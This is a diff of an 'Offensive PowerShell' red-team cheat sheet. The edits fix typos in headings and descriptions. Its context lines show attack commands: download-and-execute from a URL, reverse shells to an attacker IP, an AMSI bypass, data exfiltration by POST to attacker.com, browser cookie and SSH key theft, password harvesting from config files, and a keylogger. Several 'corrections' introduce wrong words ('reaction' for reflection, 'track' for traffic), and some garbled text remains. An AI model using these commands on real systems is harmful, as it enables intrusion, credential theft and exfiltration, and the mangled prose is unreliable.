@@ -33,18 +33,18 @@ title: Offensive PowerShell
 - [Bypassing Script Execution Policy](#bypassing-script-execution-policy)
 - [In-Memory Script Execution](#in-memory-script-execution)
 - [Dynamic Invocation with Reflection](#dynamic-invocation-with-reflection)
-- [Enccooddeed Command Execution](#enccooddeed-command-execution)
+- [Encoded Command Execution](#encoded-command-execution)
 - [Utilizing PowerShell Runspaces for Evasion](#utilizing-powershell-runspaces-for-evasion)
 - [Environment Variable Obfuscation](#environment-variable-obfuscation)
 - [Function Renaming for Evasion](#function-renaming-for-evasion)
-- [Using PowerShell Classes for CCooddee Hiding](#using-powershell-classes-for-ccooddee-hiding)
+- [Using PowerShell Classes for Code Hiding](#using-powershell-classes-for-code-hiding)
 - [Registry Key Usage for Persistence](#registry-key-usage-for-persistence)
 - [Out-Of-Band Data Exfiltration](#out-of-band-data-exfiltration)
 - [Using PowerShell to Access WMI for Stealth](#using-powershell-to-access-wmi-for-stealth)
 - [Scheduled Task for Persistence](#scheduled-task-for-persistence)
 - [Using PowerShell to Interact with the Network Quietly](#using-powershell-to-interact-with-the-network-quietly)
 - [Base 64 Encoding for Command Obfuscation](#base-64-encoding-for-command-obfuscation)
-- [Utilizing PowerShell Add-Type for CCooddee Execution](#utilizing-powershell-add-type-for-ccooddee-execution)
+- [Utilizing PowerShell Add-Type for Code Execution](#utilizing-powershell-add-type-for-code-execution)
 - [Extracting Credentials from Windows Credential Manager](#extracting-credentials-from-windows-credential-manager)
 - [Retrieving Passwords from Unsecured Files](#retrieving-passwords-from-unsecured-files)
 - [Dumping Credentials from Windows Services](#dumping-credentials-from-windows-services)
@@ -96,7 +96,7 @@ Get-WmiObject -Class Win32_OperatingSystem | Select-Object -Property *
 ```
 
 ### Extracting Network Configuration
-This command gathers network conguration details such as interface aliases, IPv4 and IPv6 
+This command gathers network configuration details such as interface aliases, IPv4 and IPv6 
 addresses, and DNS server information.
 
 ```powershell
@@ -144,7 +144,7 @@ Invoke-Command -ComputerName TargetPC -ScriptBlock { Get-Process } -Credential (
 ```
 
 ### Downloading and Executing Scripts from URL
-Downloads and executes a PowerShell script from a specied URL. Useful for executing remote payloads.
+Downloads and executes a PowerShell script from a specific URL. Useful for executing remote payloads.
 
 ```powershell
 $url = 'http://example.com/script.ps1'; Invoke-Expression (New-Object
@@ -192,7 +192,7 @@ $watcher 'Created' -Action { Write-Host 'File Created: ' $Event.SourceEventArgs.
 
 ### Creating Reverse Shell
 
-Establishes a reverse shell connection to a specied attacker-controlled machine, allowing remote command
+Establishes a reverse shell connection to a specified attacker-controlled machine, allowing remote command
 execution.
 
 ```powershell
@@ -228,8 +228,7 @@ NetEventSession -Name 'Session1' after 60
 Bypasses the Anti-Malware Scan Interface (AMSI) in PowerShell, allowing the execution of potentially malicious scripts without detection.
 
 ```powershell
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,S
-tatic').SetValue($null,$true)
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
 
 ### Extracting System Secrets with Mimikatz
@@ -301,12 +300,12 @@ script here; Set-ExecutionPolicy -ExecutionPolicy $policy -Scope Process
 Executes a PowerShell script entirely in memory without writing to disk, helping to evade le-based detection mechanisms.
 
 ```powershell
-$code = [System.IO.File]::ReadAllText('C:\temp\script.ps1'); Invoke-Expression $codecode code
+$code = [System.IO.File]::ReadAllText('C:\temp\script.ps1'); Invoke-Expression $code code
 ```
 
 ### Dynamic Invocation with Reflection
 
-Uses reection to dynamically invoke system management functions, allowing for more stealthy execution of commands.
+Uses reaction to dynamically invoke system management functions, allowing for more stealthy execution of commands.
 
 ```powershell
 $assembly = [Reflection.Assembly]::LoadWithPartialName('System.Management'); $type =
@@ -315,9 +314,9 @@ $type.GetConstructor(@([string])); $instance = $constructor.Invoke(@('SELECT * F
 $method = $type.GetMethod('Get'); $result = $method.Invoke($instance, @())
 ```
 
-### Enccooddeed Command Execution
+### Encoded Command Execution
 
-Executes a Base64-encoded PowerShell command, which can help bypass simple command-line logging andcode analysis tools.
+Executes a Base64-encoded PowerShell command, which can help bypass simple command-line logging and code analysis tools.
 
 ```powershell
 $encodedCmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('Get-Process'));code code
@@ -351,9 +350,9 @@ Renames a PowerShell function to something less conspicuous, which can help in e
 Function MyGetProc { Get-Process }; MyGetProc
 ```
 
-### Using PowerShell Classes for CCooddee Hiding
+### Using PowerShell Classes for Code Hiding
 
-Defines a custom PowerShell class to encapsulate and hide malicious code, making it harder for security toolscode to detect.
+Defines a custom PowerShell class to encapsulate and hide malicious code, making it harder for security tools to detect.
 
 ```powershell
 class HiddenCode { [string] Run() { return 'Hidden command executed' } }; $instance =Code
@@ -366,13 +365,13 @@ Uses the Windows Registry to store and later execute encoded payloads, aiding in
 
 ```powershell
 $path = 'HKCU:\Software\MyApp'; New-Item -Path $path -Force; New-ItemProperty -Path $path -Name
-'Config' -Value 'EncodedPayload' -PropertyType String -Force; $regValue = Get-ItemProperty -Path $pathcode
+'Config' -Value 'EncodedPayload' -PropertyType String -Force; $regValue = Get-ItemProperty -Path $path
 -Name 'Config'; Invoke-Expression $regValue.Config
 ```
 
 ### Out-Of-Band Data Exfiltration
 
-Exfiltrates data out of the target network using web requests, which can bypass traditional data loss prevention mechanisms.
+Exfiltrate data out of the target network using web requests, which can bypass traditional data loss prevention mechanisms.
 
 ```powershell
 $data = Get-Process | ConvertTo-Json; Invoke-RestMethod -Uri 'http://attacker.com/data' -Method Post - Body $data
@@ -415,7 +414,7 @@ $command = 'Get-Process'; $encodedCommand =code
 EncodedCommand $encodedCommand
 ```
 
-### Utilizing PowerShell Add-Type for CCooddee Execution
+### Utilizing PowerShell Add-Type for Code Execution
 
 Defines and executes code within a custom .NET class using PowerShell, which can be used to hide malicious activities within seemingly benign code
 
@@ -444,8 +443,8 @@ Select-String -Path C:\Users\*\Documents\*.txt -Pattern 'password' -CaseSensitiv
 
 ### Dumping Credentials from Windows Services
 
-Lists Windows services that are running under a specic user account, which can sometimes include
-credentials in the service conguration.
+Lists Windows services that are running under a specifc user account, which can sometimes include
+credentials in the service configuration.
 
 ```powershell
 Get-WmiObject win32_service | Where-Object {$_.StartName -like '*@*'} | Select-Object Name, StartName,DisplayName
@@ -469,7 +468,7 @@ $env:USERPROFILE + '\AppData\Local\Google\Chrome\User Data\Default\Cookies' | Ge
 
 ### Extracting Credentials from IIS Application Pools
 
-Retrieves conguration details of IIS Application Pools, including service accounts, which might contain credentials.
+Retrieves configuration details of IIS Application Pools, including service accounts, which might contain credentials.
 
 ```powershell
 Import-Module WebAdministration; Get-IISAppPool | Select-Object Name, ProcessModel
@@ -477,7 +476,7 @@ Import-Module WebAdministration; Get-IISAppPool | Select-Object Name, ProcessMod
 
 ### Reading Credentials from Configuration Files
 
-Searches for strings containing ‘password=’ in all .cong les on the C: drive, which can reveal hardcodedcode credentials.
+Searches for strings containing ‘password=’ in all .cong les on the C: drive, which can reveal hardcoded credentials.
 
 ```powershell
 Get-ChildItem -Path C:\ -Include *.config -Recurse | Select-String -Pattern 'password='
@@ -485,7 +484,7 @@ Get-ChildItem -Path C:\ -Include *.config -Recurse | Select-String -Pattern 'pas
 
 ### Dumping Credentials from Scheduled Tasks
 
-Lists scheduled tasks that are congured to run under specic user accounts, potentially revealing credentials used for task execution.
+Lists scheduled tasks that are configured to run under specifc user accounts, potentially revealing credentials used for task execution.
 
 ```powershell
 Get-ScheduledTask | Where-Object {$_.Principal.UserId -notlike 'S-1-5-18'} | Select-Object TaskName, TaskPath, Principal
@@ -501,7 +500,7 @@ Get-ChildItem -Path C:\Users\*\.ssh\id_rsa -Recurse
 
 ### Retrieving Credentials from Database Connection Strings
 
-Scans for database connection strings in web application conguration les, which often contain credentials for database access.
+Scans for database connection strings in web application configuration les, which often contain credentials for database access.
 
 ```powershell
 Select-String -Path C:\inetpub\wwwroot\*.config -Pattern 'connectionString' -CaseSensitive
@@ -509,7 +508,7 @@ Select-String -Path C:\inetpub\wwwroot\*.config -Pattern 'connectionString' -Cas
 
 ### Simple PowerShell Reverse Shell
 
-Establishes a basic reverse shell connection to a specied attacker-controlled machine. This allows the attacker to execute commands remotely.
+Establishes a basic reverse shell connection to a specified attacker-controlled machine. This allows the attacker to execute commands remotely.
 
 ```powershell
 $client = New-Object System.Net.Sockets.TCPClient('attacker_ip', attacker_port); $stream =
@@ -549,7 +548,7 @@ $ClientWebSocket.SendAsync($bytesToSend, 'Binary', $true, $null).Wait() }
 
 ### DNS-Based PowerShell Reverse Shell
 
-This script uses DNS requests to exltrate data, making the reverse shell trac appear as DNS queries, which can be less suspicious and harder to detect.
+This script uses DNS requests to exfiltrate data, making the reverse shell track appear as DNS queries, which can be less suspicious and harder to detect.
 
 ```powershell
 function Invoke-DNSReverseShell { param([string]$attacker_ip, [int]$attacker_port) $client = New-Object
@@ -590,7 +589,7 @@ eq -32767) { $Key = [System.Enum]::GetName([System.Windows.Forms.Keys], $i) Writ
 
 ### Accessing Physical Memory with Windows API
 
-This PowerShell script uses the ReadProcessMemory function from the Windows API to read a specied amount of memory from a process. It’s useful for extracting information from running processes.
+This PowerShell script uses the ReadProcessMemory function from the Windows API to read a specified amount of memory from a process. It’s useful for extracting information from running processes.
 
 ```powershell
 Add-Type -TypeDefinition @" using System; using System.Runtime.InteropServices; public class
@@ -627,7 +626,7 @@ string lpDisplayName, int dwDesiredAccess, int dwServiceType, int dwStartType, i
 string lpBinaryPathName, string lpLoadOrderGroup, IntPtr lpdwTagId, string lpDependencies, string lp,
 string lpPassword); [DllImport("advapi32.dll", SetLastError = true)] public static extern bool
 StartService(IntPtr SVHANDLE, int dwNumServiceArgs, string lpServiceArgVectors); } "@ $scManagerHandle
-= [ServiceManager]::OpenSCManager(null, null, 0xF003F) # Further code to create, modify, or startcode
+= [ServiceManager]::OpenSCManager(null, null, 0xF003F) # Further code to create, modify, or start
 services goes here
 ```
 
@@ -655,8 +654,8 @@ CF_TEXT format $gLock = [ClipboardAPI]::GlobalLock($clipboardData) $size =
 
 ### Finding Writable and Executable Memory
 
-This script is used to identify memory regions within a process that are both writable and executable. Such memory regions can be indicative of malicious activity, such as the injection of shellcode. The script starts bycode
-opening a process with limited query access and then enumerates the virtual memory regions, ltering for those with ExecuteReadWrite protection.
+This script is used to identify memory regions within a process that are both writable and executable. Such memory regions can be indicative of malicious activity, such as the injection of shellcode. The script starts by
+opening a process with limited query access and then enumerates the virtual memory regions, iterating for those with ExecuteReadWrite protection.
 
 **Description** : This technique is useful for identifying potential malicious memory usage within processes, which can be a sign of code injection or other forms of runtime manipulation.
 
@@ -667,7 +666,7 @@ $proc | Where-Object { $_.Protect -band "ExecuteReadWrite" }
 
 ### Finding Shared Section Handles
 
-This script identies writable Section objects that are shared between two processes. It rst groups handles by their kernel object address and then lters for those shared between exactly two processes. It checks for MapWrite access and then determines if the Section is shared between a privileged and a low-privileged process.
+This script identifies writable Section objects that are shared between two processes. It rst groups handles by their kernel object address and then lters for those shared between exactly two processes. It checks for MapWrite access and then determines if the Section is shared between a privileged and a low-privileged process.
 
 **Description** : This technique is useful for identifying shared resources that might be exploited in privilege escalation attacks. Shared writable sections can be a vector for manipulating a higher-privileged process from
 a lower-privileged one.
@@ -695,7 +694,7 @@ RandomByte -Size $map.Length Write-NtVirtualMemory -Mapping $map -Data $random
 
 This command creates a new process using the New-Win32Process command, which internally calls the Win CreateProcess API. The command line string species the executable to run and any arguments. The CreateProcess API parses this command line to nd the executable le, handling cases where the executable name does not include an extension like .exe.
 
-**Description** : This technique is crucial for understanding how processes are created and how command line arguments are parsed in Windows. It’s particularly relevant for scenarios where a red teamer might need to execute a process with specic parameters or in a certain context.
+**Description** : This technique is crucial for understanding how processes are created and how command line arguments are parsed in Windows. It’s particularly relevant for scenarios where a red teamer might need to execute a process with specific parameters or in a certain context.
 
 ```powershell
 $proc = New-Win32Process -CommandLine "notepad test.txt"
@@ -713,7 +712,7 @@ $proc = New-Win32Process -CommandLine "notepad test.txt" -ApplicationName "c:\wi
 
 ### Using Shell APIs for Non-Executable Files
 
-This command uses Start-Process with a specied verb to handle non-executable les, such as text
+This command uses Start-Process with a specified verb to handle non-executable les, such as text
 documents. Start-Process internally uses shell APIs like ShellExecuteEx, which can handle various le types by looking up the appropriate handler from the registry.
 
 **Description** : This technique is useful when you need to interact with non-executable les in a way that mimics user actions, such as opening, editing, or printing a le. It leverages the shell’s ability to determine the correct application to use for a given le type.
@@ -722,7 +721,7 @@ managing system services. These services include:
 
 1. **Remote Procedure Call Subsystem (RPCSS)** : Manages remote procedure call endpoints.
 2. **DCOM Server Process Launcher** : Starts COM server processes.
-3. **Task Scheduler** : Schedules actions at specic times.
+3. **Task Scheduler** : Schedules actions at specific times.
 4. **Windows Installer** : Manages program installations.
 5. **Windows Update** : Automatically checks and installs updates.
 6. **Application Information** : Facilitates User Account Control (UAC) for switching between administrator and
@@ -737,7 +736,7 @@ privileges, potentially exploiting them for gaining elevated access or persisten
 This command uses Get-Win32Service, a more comprehensive alternative to the built-in Get-Service command in PowerShell. It provides detailed information about each service, including its status (Running or Stopped)
 and Process ID.
 
-**Description** : This command is useful for reconnaissance and monitoring of service states on a target system, allowing red teamers to identify potential targets or understand the system’s conguration.
+**Description** : This command is useful for reconnaissance and monitoring of service states on a target system, allowing red teamers to identify potential targets or understand the system’s configuration.
 
 ```powershell
 PS> Get-Win32Service
@@ -745,10 +744,10 @@ PS> Get-Win32Service
 
 ### Finding Executables That Import Specific APIs
 
-This script identies executables that import the CreateProcessW API, which can be crucial for nding potential targets for exploitation or understanding how certain applications interact with system processes.
+This script identifies executables that import the CreateProcessW API, which can be crucial for finding potential targets for exploitation or understanding how certain applications interact with system processes.
 
 **Description** : This technique is particularly useful for narrowing down a large set of executables to those that
-are relevant for a specic vulnerability or behavior, such as process creation.
+are relevant for a specific vulnerability or behavior, such as process creation.
 
 ```powershell
 PS> $imps = ls "$env:WinDir\*.exe" | ForEach-Object { Get-Win32ModuleImport -Path $_.FullName } PS>
@@ -764,7 +763,7 @@ This command is used to nd hidden registry keys, particularly those with NUL cha
 not visible through standard tools.
 
 **Privileges Overview** Privileges in Windows are granted to users to bypass certain security checks. They are critical for red teamers to understand as they can be exploited for elevated access. Privileges can be enabled or
-disabled, and their state is crucial for their eectiveness. 
+disabled, and their state is crucial for their effectiveness. 
 
 ```powershell
 PS> ls NtKeyUser:\SOFTWARE -Recurse | Where-Object Name -Match "`0"
@@ -785,7 +784,7 @@ can be toggled. This is crucial for modifying access rights dynamically.
 its re-enabling.
 
 **Privilege Checks**
-This command checks if a specic privilege is enabled. It’s essential for verifying the operational status of a privilege before attempting actions that require it.
+This command checks if a specific privilege is enabled. It’s essential for verifying the operational status of a privilege before attempting actions that require it.
 
 ```powershell
 PS> Test-NtTokenPrivilege SeChangeNotifyPrivilege
@@ -805,7 +804,7 @@ are created using the NtFilterToken system call or CreateRestrictedToken API.
 
 **Types of Restricted Tokens**
 
-1. **Normal Restricted Tokens** : Limit access based on specied restricted SIDs.
+1. **Normal Restricted Tokens** : Limit access based on specified restricted SIDs.
 2. **Write-Restricted Tokens** : Introduced in Windows XP SP2, these tokens prevent write access but allow
 read and execute access, making them simpler but less secure sandboxes.
 Creating and Analyzing Restricted Tokens
